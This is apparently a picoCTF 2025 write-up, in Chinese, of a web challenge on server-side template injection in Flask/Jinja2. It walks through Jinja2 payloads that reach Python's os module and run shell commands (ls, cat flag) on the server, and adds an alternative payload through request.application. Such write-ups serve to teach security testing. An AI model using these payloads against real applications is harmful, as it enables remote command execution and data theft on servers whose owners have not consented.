##### tags:`picoCTF_2025`

# picoCTF Web : SSTI1

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

## <span class="red">**題目**</span>

- ![image](https://hackmd.io/_uploads/B1VAqCAske.png)
- ![image](https://hackmd.io/_uploads/BkPRifehyx.png)

## <span class="red">**解題過程**</span>

1. **這題我沒什麼想法，但是題目是 SSTI 1 ，所以應該是與 template injection 有關。首先輸入一些想要 announce 的內容試試看**
- ![image](https://hackmd.io/_uploads/HypPcMlhyl.png)
- ![image](https://hackmd.io/_uploads/ryCiqMg3yl.png)

&emsp;

2. **沒什麼特別的東西，回到主畫面後我才發現左下角有一行小字，內容是這個 announcement 只有我自己能夠接觸到 ，這<span class="red">++通常表示輸入內容可能會被模板引擎渲染並顯示在網頁上++</span>。所以我嘗試了 ```{{7*7}}``` 這段 payload ，如果回傳 49 代表模板是 Jinja2（Python Flask/Django）**

- ![image](https://hackmd.io/_uploads/Bk9Shfxhkl.png)
- ![image](https://hackmd.io/_uploads/Hyq96Ge2Jl.png)

&emsp;

3. **確實是回傳 49 ，那就不需要測試是不是其他模板了，直接用 
```{{config.__class__.__mro__[1].__subclasses__()}}``` 
這段 payload 查看有哪些可用的類別**

- ![image](https://hackmd.io/_uploads/SkDA0Mghkx.png)

&emsp;

4. **可以發現有以個 flask.Config 的類別，於是我先 ```{{config.items()}}``` 看看 config 有哪些 item ，看到裡面有 ```SECRET_KEY``` 跟 ```SESSION_COOKIE_NAME``` ，但是值分別是 None 和 session ，所以應該不是和 ```config.items()``` 有關**

- ![image](https://hackmd.io/_uploads/BJ-_17xhJx.png)
- ![image](https://hackmd.io/_uploads/Sk4NemxnJl.png)

&emsp;

5. **回到 subclass 的那一個層級，既然 flask 可以用 ，那就試試看 RCE 。使用 
```{{config.__class__.__init__.__globals__['os']}}``` 
這段 payload 看看能不能調用到 os module ，發現結果是可以的
(```config.__class__``` 就代表 ```flask.config.Config``` 這個類別)**

- ![image](https://hackmd.io/_uploads/Sywl77xhyx.png)

&emsp;

6. **那我就直接順著 
```{{config.__class__.__init__.__globals__['os']}}``` 
這段 payload 加上 system 指令來讀取系統資訊，像是
```{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}```**

- ![image](https://hackmd.io/_uploads/B1YxNQe31g.png)

&emsp;

7. **發現這個目錄底下有 flag 檔，那就更改一下 payload 變成 ```{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}``` 
以此讀取 flag 就成功了**

- ![image](https://hackmd.io/_uploads/S1siN7lhyx.png)

## <span class="red">**額外心得**</span>

1. **另外一種解法(從當前的 app 調用 ```__globals__``` 來使用)：
```{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}```
其中 ```request.application``` 指的是<span class="blue">當前的 Flask 應用物件</span> ，等同於 ```Flask(__name__)```**